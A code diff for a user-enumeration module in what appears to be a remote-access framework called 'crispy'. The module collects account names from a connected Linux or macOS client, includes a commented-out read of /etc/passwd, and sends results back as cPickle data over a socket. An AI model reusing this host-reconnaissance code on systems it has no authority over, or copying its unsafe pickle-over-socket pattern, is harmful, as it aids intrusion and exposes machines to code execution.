@@ -1,4 +1,5 @@
 import cPickle
+import json
 import logging
 
 from crispy.lib.module import *
@@ -24,7 +25,7 @@ class UsersModule(CrispyModule):
                 info += "{}\n".format(user)
         return info
 
-    marshall_linux = """
+    def marshall_linux(self):
         import os
         import subprocess
 
@@ -34,7 +35,7 @@ class UsersModule(CrispyModule):
             info += user
         #users = subprocess.check_call(['cat', '/etc/passwd'])
         return info
-    """
+    
 
     def run(self, args):
         logger.debug("users run() was called")
@@ -45,7 +46,7 @@ class UsersModule(CrispyModule):
                 if self.client.is_darwin():
                     self.client.conn.sendall(cPickle.dumps(self.marshall_darwin(), -1))
                 elif self.client.is_linux():
-                    self.client.conn.sendall(cPickle.dumps(self.marshall_linux(), -1))
+                    self.client.conn.sendall(cPickle.dumps(self.marshall_linux()))
             
                 print self.client.conn.recv(1024).rstrip()
             except Exception as e:
